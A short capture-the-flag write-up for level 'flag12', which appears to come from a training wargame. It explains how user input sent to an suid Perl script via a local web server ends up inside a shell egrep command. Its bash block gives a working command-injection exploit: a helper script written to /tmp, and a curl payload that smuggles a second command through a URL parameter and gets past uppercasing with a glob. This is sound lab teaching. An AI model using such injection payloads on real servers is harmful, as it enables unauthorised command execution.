# flag12

The home for this user contains an suid perl script

This script takes user input and does the following:
- substitute all lowercase letters for uppercase letters
- finds the first space and removes everything after it

..it then runs this modified input in the following command:

`egrep "^$xx" /tmp/xd 2>&1`

..where `$xx` is our user-controlled input.

We use globbing `/*/` to access a directory where we have permissions, and add a script that runs getflag, and in full uppercase letters to not be affected by the string modification, and then run `curl` to pass on params to the web server:

```bash
cat <<EOF
#!/bin/bash
getflag >> /tmp/ptdr
EOF > /tmp/WOW

chmod +x /tmp/WOW

curl localhost:4646 -G --data-urlencode 'x=X";/*/WOW;["'

cat /tmp/ptdr
```

giving us our flag, we can now login as `level13`
